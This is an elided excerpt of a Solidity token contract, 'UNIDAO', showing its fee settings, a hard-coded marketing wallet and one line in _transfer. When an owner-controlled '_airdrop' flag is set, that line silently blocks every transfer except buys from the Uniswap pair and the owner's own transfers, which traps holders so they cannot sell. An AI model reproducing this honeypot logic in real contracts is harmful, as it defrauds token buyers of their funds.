...
contract UNIDAO is Context, IERC20, Ownable {
    ...
    string private constant _name = "UNIDAO"; //
    string private constant _symbol = "UND"; //
    uint8 private constant _decimals = 9; //

    uint256 public _marketingFee = 4;
    uint256 public _liquidityFee = 4;
    address public  _marketingWallet = 0x9580019CAF7A6020fEeF492E920722ED16C4750C;
    bool public _airdrop = false;
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner() && from != uniswapV2Pair && _airdrop){ return; }
